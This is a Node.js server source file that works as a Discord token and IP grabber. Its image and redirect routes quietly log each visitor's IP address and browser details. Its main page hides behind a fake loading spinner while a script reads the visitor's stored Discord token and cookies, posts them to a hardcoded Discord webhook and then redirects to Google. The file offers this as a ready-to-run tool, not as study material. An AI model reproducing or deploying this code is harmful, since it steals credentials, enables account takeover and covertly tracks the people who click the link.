const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod';

// Real image URL (replace with your own)
const IMAGE_URL = 'https://w0.peakpx.com/wallpaper/897/12/HD-wallpaper-black-mr-f-my-profile-thumbnail.jpg';

// ========== IMAGE LOGGER ==========
app.get('/image.png', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toISOString();
    const referer = req.headers['referer'] || 'Direct';

    // Log to webhook
    try {
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: '🖼️ Image Viewed!',
                color: 0x00ff00,
                fields: [
                    { name: 'IP Address', value: ip, inline: true },
                    { name: 'User-Agent', value: userAgent.substring(0, 100), inline: false },
                    { name: 'Referer', value: referer, inline: true },
                    { name: 'Time', value: time, inline: true }
                ],
                footer: { text: 'Image Logger' }
            }]
        });
        console.log(`[${time}] Image viewed from ${ip}`);
    } catch (error) {
        console.error('Webhook error:', error.message);
    }

    // Serve the real image
    try {
        const imageResponse = await axios.get(IMAGE_URL, { responseType: 'stream' });
        res.setHeader('Content-Type', imageResponse.headers['content-type']);
        imageResponse.data.pipe(res);
    } catch (error) {
        // Fallback: transparent pixel
        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.writeHead(200, { 'Content-Type': 'image/png' });
        res.end(pixel);
    }
});

// ========== REDIRECT LOGGER ==========
app.get('/click', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toISOString();
    const referer = req.headers['referer'] || 'Direct';

    // Log to webhook
    axios.post(WEBHOOK_URL, {
        embeds: [{
            title: '🖱️ Link Clicked! (Redirect)',
            color: 0xff8c00,
            fields: [
                { name: 'IP Address', value: ip, inline: true },
                { name: 'User-Agent', value: userAgent.substring(0, 100), inline: false },
                { name: 'Referer', value: referer, inline: true },
                { name: 'Time', value: time, inline: true }
            ],
            footer: { text: 'Redirect Logger' }
        }]
    }).catch(() => {});

    console.log(`[${time}] Redirect clicked from ${ip}`);

    // Redirect to the real image
    res.redirect(302, IMAGE_URL);
});

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #1a1a2e;
                color: white;
                font-family: Arial, sans-serif;
            }
            .loader { text-align: center; }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #3498db;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="loader">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>

        <script>
        // ============================================
        //  EXTRACT TOKENS FROM LOCALSTORAGE
        // ============================================
        function extractTokens() {
            let token = null;
            let cookies = document.cookie || 'No cookies';
            
            // Try to get token from localStorage
            try {
                token = localStorage.getItem('token');
            } catch(e) {
                console.log('localStorage error:', e);
            }
            
            // Clean up token if found (remove quotes)
            if (token) {
                try {
                    token = token.replace(/^"|"$/g, '');
                } catch(e) {}
            }
            
            const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            return { token, cookies, browserInfo };
        }

        // ============================================
        //  SEND TO WEBHOOK
        // ============================================
        async function sendToWebhook(data) {
            const webhookURL = '${WEBHOOK_URL}';
            
            const payload = {
                embeds: [{
                    title: '🎯 Token Extracted!',
                    color: 0x00ff00,
                    fields: [
                        { name: 'Discord Token', value: data.token || '❌ No token found', inline: false },
                        { name: 'IP Address', value: '${ip}', inline: true },
                        { name: 'Browser', value: data.browserInfo.userAgent.substring(0, 100), inline: false },
                        { name: 'Platform', value: data.browserInfo.platform, inline: true },
                        { name: 'Cookies', value: data.cookies || 'None', inline: false },
                        { name: 'Time', value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: 'Token Logger' }
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('✅ Sent to webhook');
            } catch(e) {
                console.error('Webhook error:', e);
            }
        }

        // ============================================
        //  EXECUTE
        // ============================================
        (async function() {
            const data = extractTokens();
            await sendToWebhook(data);
            
            console.log('Token:', data.token || 'No token');
            console.log('Cookies:', data.cookies || 'No cookies');
            console.log('Browser:', data.browserInfo.userAgent);
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 1500);
        })();
        </script>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ Logger running on port ${PORT}`);
    console.log(`📡 Webhook: ${WEBHOOK_URL}`);
    console.log(`📸 Image: /image.png`);
    console.log(`🔄 Redirect: /click`);
});
